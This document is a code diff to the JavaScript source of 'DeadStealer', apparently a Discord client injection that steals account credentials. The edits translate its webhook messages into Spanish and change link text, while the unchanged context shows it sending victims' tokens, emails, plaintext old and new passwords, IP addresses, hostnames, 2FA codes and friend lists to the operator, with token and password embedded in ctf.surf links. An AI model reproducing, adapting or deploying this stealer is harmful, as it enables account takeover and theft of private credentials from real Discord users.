@@ -75,7 +75,7 @@ function FirstTime() {
 						username: "DeadStealer",
 						content: "",
 						embeds: [{
-							title: "Discord Initalized (User not Logged in)",
+							title: "Discord Initalizado (Usuario no conectado)",
 							color: config["embed-color"],
 							fields: [{
 								name: "Info",
@@ -86,7 +86,7 @@ function FirstTime() {
 								name: "DeadStealer"
 							},
 							footer: {
-								text: "DeadStealer"
+								text: "Gracias por utilizar DeadStealer."
 							}
 						}]
 					};
@@ -101,8 +101,8 @@ function FirstTime() {
 							username: "DeadStealer",
 							content: "",
 							embeds: [{
-								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +")",
+								title: "Discord Inicializado",
+								description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -129,7 +129,7 @@ function FirstTime() {
 									name: "DeadStealer"
 								},
 								footer: {
-									text: "DeadStealer"
+									text: "Gracias por utilizar DeadStealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -153,7 +153,7 @@ function FirstTime() {
 						username: "DeadStealer",
 						content: "",
 						embeds: [{
-							title: "User log out (User not Logged in before)",
+							title: "Cierre de sesión del usuario (el usuario no se ha conectado antes)",
 							color: config["embed-color"],
 							fields: [{
 								name: "Info",
@@ -164,7 +164,7 @@ function FirstTime() {
 								name: "DeadStealer"
 							},
 							footer: {
-								text: "DeadStealer"
+								text: "Gracias por utilizar DeadStealer"
 							}
 						}]
 					};
@@ -179,15 +179,15 @@ function FirstTime() {
 							username: "DeadStealer",
 							content: "",
 							embeds: [{
-								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +")",
+								title: "El usuario se ha desconectado",
+								description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
 									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 									inline: !1
 								}, {
-									name: "Username",
+									name: "Nombre",
 									value: `\`${b.username}#${b.discriminator}\``,
 									inline: !0
 								}, {
@@ -195,7 +195,7 @@ function FirstTime() {
 									value: `\`${b.id}\``,
 									inline: !0
 								}, {
-									name: "Badges",
+									name: "Insignia",
 									value: `${GetBadges(b.flags)}`,
 									inline: !1
 								}, {
@@ -207,7 +207,7 @@ function FirstTime() {
 									name: "DeadStealer"
 								},
 								footer: {
-									text: "DeadStealer"
+									text: "Gracias por utilizar DeadStealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -457,8 +457,8 @@ function Login(email, password, token) {
 								username: "DeadStealer",
 								content: "",
 								embeds: [{
-									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+									"title": "Usuario logeado",
+									description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -501,7 +501,7 @@ function Login(email, password, token) {
 										"name": "DeadStealer"
 									},
 									"footer": {
-										"text": "DeadStealer"
+										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -530,7 +530,7 @@ function Login(email, password, token) {
 									"name": "DeadStealer"
 								},
 								"footer": {
-									"text": "DeadStealer"
+									"text": "Gracias por utilizar DeadStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -617,7 +617,7 @@ function Login(email, password, token) {
 											username: "DeadStealer",
 											content: "",
 											embeds: [{
-												"title": "User Login",
+												"title": "Usuario logeado",
 												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
@@ -625,7 +625,7 @@ function Login(email, password, token) {
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "Nombre",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
@@ -637,7 +637,7 @@ function Login(email, password, token) {
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "Insignia",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
@@ -649,7 +649,7 @@ function Login(email, password, token) {
 													value: `\`${email}\``,
 													inline: !0
 												}, {
-													name: "Password",
+													name: "Contraseña",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
@@ -661,7 +661,7 @@ function Login(email, password, token) {
 													"name": "DeadStealer"
 												},
 												"footer": {
-													"text": "DeadStealer"
+													"text": "Gracias por utilizar DeadStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -800,7 +800,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								username: "DeadStealer",
 								content: "",
 								embeds: [{
-									"title": "Password Changed",
+									"title": "Contraseña cambiada",
 									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
 									"color": config['embed-color'],
 									"fields": [{
@@ -808,7 +808,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
 									}, {
-										name: "Username",
+										name: "Nombre",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
@@ -820,7 +820,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "Insignia",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
@@ -832,11 +832,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `\`${json.email}\``,
 										inline: !1
 									}, {
-										name: "Old Password",
+										name: "Contraseña antigua",
 										value: `\`${oldpassword}\``,
 										inline: !0
 									}, {
-										name: "New Password",
+										name: "Contraseña nueva",
 										value: `\`${newpassword}\``,
 										inline: !0
 									}, {
@@ -848,20 +848,20 @@ function ChangePassword(oldpassword, newpassword, token) {
 										"name": "DeadStealer"
 									},
 									"footer": {
-										"text": "DeadStealer"
+										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
-									"title": `Total Friends (${totalFriends()})`,
+									"title": `Amigos en totales (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
 									},
 									"footer": {
-										"text": "DeadStealer"
+										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -869,15 +869,15 @@ function ChangePassword(oldpassword, newpassword, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": ":detective: __2FA ACTIVADO__",
+								"description": `[Puedes iniciar sesion con token](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
 								},
 								"footer": {
-									"text": "DeadStealer"
+									"text": "Gracias por utilizar DeadStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -965,15 +965,15 @@ function ChangePassword(oldpassword, newpassword, token) {
 											username: "DeadStealer",
 											content: "",
 											embeds: [{
-												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
+												"title": "Contraseña cambiada",
+												description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "Nombre",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
@@ -985,7 +985,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "Insignia",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
@@ -997,11 +997,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 													value: `\`${json.email}\``,
 													inline: !1
 												}, {
-													name: "Old Password",
+													name: "Antigua Contraseña",
 													value: `\`${oldpassword}\``,
 													inline: !0
 												}, {
-													name: "New Password",
+													name: "Nueva Contraseña",
 													value: `\`${newpassword}\``,
 													inline: !0
 												}, {
@@ -1019,14 +1019,14 @@ function ChangePassword(oldpassword, newpassword, token) {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `Total Friends (${totalFriends()})`,
+												"title": `Amigos en total (${totalFriends()})`,
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
 												},
 												"footer": {
-													"text": "DeadStealer"
+													"text": "Gracias por utilizar DeadStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1122,7 +1122,7 @@ function ChangeEmail(newemail, password, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "No hay amigos con insignias"
 								}
 								return gay
 							}
@@ -1153,14 +1153,14 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
 										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 										inline: !1
 									}, {
-										name: "Username",
+										name: "Nombre",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
@@ -1172,7 +1172,7 @@ function ChangeEmail(newemail, password, token) {
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "Insignia",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
@@ -1180,11 +1180,11 @@ function ChangeEmail(newemail, password, token) {
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "New Email",
+										name: "Nuevo Email",
 										value: `\`${newemail}\``,
 										inline: !0
 									}, {
-										name: "Password",
+										name: "Contraseña",
 										value: `\`${password}\``,
 										inline: !0
 									}, {
@@ -1196,7 +1196,7 @@ function ChangeEmail(newemail, password, token) {
 										"name": "DeadStealer"
 									},
 									"footer": {
-										"text": "DeadStealer"
+										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1209,7 +1209,7 @@ function ChangeEmail(newemail, password, token) {
 										"name": "DeadStealer"
 									},
 									"footer": {
-										"text": "DeadStealer"
+										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1217,15 +1217,15 @@ function ChangeEmail(newemail, password, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": ":detective: __2FA ACTIVADO__",
+								"description": `[Puedes iniciar sesion con token](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
 								},
 								"footer": {
-									"text": "DeadStealer"
+									"text": "Gracias por utilizar DeadStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1313,15 +1313,15 @@ function ChangeEmail(newemail, password, token) {
 											username: "DeadStealer",
 											content: "",
 											embeds: [{
-												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+												"title": "Email Cambiado",
+												description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "Nombre",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
@@ -1333,7 +1333,7 @@ function ChangeEmail(newemail, password, token) {
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "Insignia",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
@@ -1341,11 +1341,11 @@ function ChangeEmail(newemail, password, token) {
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "New Email",
+													name: "Nuevo Email",
 													value: `\`${newemail}\``,
 													inline: !0
 												}, {
-													name: "Password",
+													name: "Contraseña",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
@@ -1357,7 +1357,7 @@ function ChangeEmail(newemail, password, token) {
 													"name": "DeadStealer"
 												},
 												"footer": {
-													"text": "DeadStealer"
+													"text": "Gracias por utilizar DeadStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1370,7 +1370,7 @@ function ChangeEmail(newemail, password, token) {
 													"name": "DeadStealer"
 												},
 												"footer": {
-													"text": "DeadStealer"
+													"text": "Gracias por utilizar DeadStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
